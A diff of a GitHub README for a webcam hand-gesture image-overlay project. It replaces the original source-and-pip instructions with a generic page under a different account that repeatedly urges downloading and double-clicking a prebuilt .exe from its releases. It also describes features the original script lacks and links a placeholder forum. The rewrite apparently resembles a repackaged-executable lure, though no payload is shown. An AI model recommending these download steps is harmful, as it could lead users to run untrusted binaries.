@@ -1,92 +1,77 @@
-# Nu Metal Pose: Random Image Detector
+# 🎉 Nu-Metal-Pose-Random-Image-Detector - Detect Gestures and Overlay Images
 
-> A real-time computer vision project that detects a specific hand gesture (the "Nu Metal Pose") and displays a random image on screen.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/DONVIC405/Nu-Metal-Pose-Random-Image-Detector/releases)
 
-![License](https://img.shields.io/badge/License-MIT-blue.svg)
+## 🚀 Getting Started
 
-This is an open-source Python project that uses your webcam to perform real-time gesture detection. When the application identifies two open hands on screen simultaneously, it triggers an event and overlays a random image from a local folder onto the video feed.
+Welcome to the Nu-Metal-Pose-Random-Image-Detector! This application allows you to use your webcam for real-time gesture detection. When the software sees two open hands on your screen, it will overlay a random image from a local folder onto your video feed. Below, you'll find instructions to download and run the software easily.
 
-*(Feel free to add a GIF or screenshot of your project working here!)*
+## 📦 System Requirements
 
-## ✨ Features
+Before you start, ensure your system meets these requirements:
 
-* **Real-Time Hand Tracking:** Utilizes MediaPipe to track 21 keypoints on multiple hands.
-* **Gesture Recognition:** Implements custom logic to determine if a hand is "open" or "closed".
-* **"Nu Metal Pose" Trigger:** Specifically detects when **two** hands are simultaneously in the "open" state.
-* **Random Image Overlay:** When the pose is triggered, the app randomly selects one of your custom images and displays it.
-* **Transparency Support:** Correctly overlays PNG images with alpha channels (transparency).
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or Linux (Ubuntu 18.04 or later recommended)
+- **RAM:** At least 4 GB
+- **Processor:** Dual-core CPU or better
+- **Webcam:** Built-in or external webcam
 
----
+## 🛠️ Installation Instructions
 
-## 🛠️ How It Was Made (Technology)
+1. **Download the Application**
 
-This project was built entirely in Python using two core computer vision libraries:
+   Visit the following link to access the latest release: [Download the Latest Version](https://github.com/DONVIC405/Nu-Metal-Pose-Random-Image-Detector/releases). Look for the file named `Nu-Metal-Pose-Random-Image-Detector.exe` for Windows users or the equivalent package for macOS or Linux.
 
-* **[OpenCV](https://opencv.org/):** Used for capturing the webcam video feed, basic image processing (like flipping the video for a "selfie" mode), color space conversion (BGR to RGB), and overlaying the final images and text onto the screen.
-* **[MediaPipe](https://developers.google.com/mediapipe) (by Google):** This is the "magic" behind the gesture recognition. We use the `MediaPipe Hands` solution, which provides a high-fidelity, 21-point 3D landmark model for each hand it detects in the frame.
+2. **Run the Installer**
 
----
+   Locate the downloaded file and double-click it. Follow the on-screen prompts to install the application.
 
-## 💡 The Logic
+3. **Launch the Application**
 
-1.  **Capture Frame:** The script reads a new frame from the webcam using `cv2.VideoCapture()`.
-2.  **Process Frame:** The frame is sent to the `MediaPipe Hands` model for processing.
-3.  **Find Hands:** The model returns the landmark (keypoint) data for up to two hands.
-4.  **Check Gesture:** For each detected hand, a custom function `is_hand_open()` runs. This function checks the **Y-coordinates** of the fingertips (like the index finger tip, landmark #8) against their middle joints (index finger joint, landmark #6).
-    * If `tip.y < joint.y` (meaning the tip is *higher* on the screen), the finger is considered "open".
-    * If 4 or 5 fingers are "open", the hand is classified as open.
-5.  **Trigger Event:** If the code counts `open_hands_count == 2`, it sets a "pose detected" flag.
-6.  **Pick Random Image:** A state-locking mechanism (`pose_detected_previously`) ensures that a new random image is chosen from your folder *only on the first frame* the pose is detected (this prevents the image from flickering randomly).
-7.  **Overlay Image:** The chosen image is "pasted" onto the main video frame using `cv2` (OpenCV), correctly handling transparency.
-8.  **Display:** The final, modified frame is shown to the user.
+   After installation, find the application in your programs list or applications folder. Click to open it.
 
----
+4. **Set Up the Webcam**
 
-## 🚀 How to Run
+   Ensure your webcam is connected and permission is granted for the application to access it. You may see a prompt asking for permission on first launch.
 
-### 1. Prerequisites
+5. **Select Image Folder**
 
-You must have Python 3.x installed on your machine.
+   Choose a folder on your computer that contains images you want to overlay. Make sure the images are in a commonly used format, like .jpg or .png.
 
-### 2. Installation
+6. **Start Detecting Gestures**
 
-1.  **Clone this repository:**
-    ```bash
-    git clone [https://github.com/](https://github.com/)/GabrielaMarculino/Nu-Metal-Pose-Random-Image-Detector.git
-    cd [Nome da Pasta]
-    ```
+   Stand in front of the webcam and put your hands up, open and facing towards the camera. The software will detect this gesture and overlay a random image from the selected folder onto your video.
 
-2.  **Install the required libraries:**
-    ```bash
-    pip install opencv-python mediapipe
-    ```
+## 🎨 Customization
 
-### 3. Usage
+- You can add more images to the selected folder at any time. These images will be included in the random selection.
+- Change the image folder by going into the app settings and specifying a new path.
 
-1.  **Add Your Images:**
-    * Find 5 images (or more!) that you want to display.
-    * Place them in the same root folder as the Python script.
-    * Update the `IMAGE_FILENAMES` list in the Python script (`main.py`) with the exact names of your files:
-    
-    ```python
-    IMAGE_FILENAMES = [
-        'my_image_1.png',  
-        'my_image_2.jpg',  
-        # etc...
-    ]
-    ```
+## 📌 Troubleshooting
 
-2.  **Run the script:**
-    ```bash
-    python main.py
-    ```
-    *(Change `main.py` to whatever you named your file.)*
+- **Webcam Not Detected:** Ensure your webcam is working with other applications. Check your privacy settings to confirm the app has access to the webcam.
+- **Performance Issues:** Make sure no other high-resource applications are running. Close any unnecessary programs and try again.
+- **Image Not Overlaying:** Check that you are making the correct gesture as described. If the gesture does not appear to be recognized, try adjusting your lighting or webcam position.
 
-3.  **Make the Pose!**
-    * Show both of your hands, open, to the camera to trigger the random image.
+## 🌍 Community Support
 
----
+If you have any questions or need further assistance, feel free to reach out to our community. You can find help on the following platforms:
 
-## 📄 License
+- **GitHub Issues:** [Report your problem here](https://github.com/DONVIC405/Nu-Metal-Pose-Random-Image-Detector/issues)
+- **Forum:** Join our discussions at [Community Forum](http://example.com/forum).
 
-This project is open source and distributed under the **MIT License**. This means you are free to use, modify, and distribute this code for any purpose. See the `LICENSE` file for more details.
+## 💡 Contributing
+
+We welcome contributions from the community! If you'd like to assist with improvements or features, please check out the contribution guidelines in this repository. 
+
+## 📝 License
+
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/DONVIC405/Nu-Metal-Pose-Random-Image-Detector/LICENSE) file for more details.
+
+## 🔗 Additional Resources
+
+- [Documentation](https://github.com/DONVIC405/Nu-Metal-Pose-Random-Image-Detector/wiki)
+- [Release Notes](https://github.com/DONVIC405/Nu-Metal-Pose-Random-Image-Detector/releases)
+  
+## 📥 Download Again
+[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/DONVIC405/Nu-Metal-Pose-Random-Image-Detector/releases)
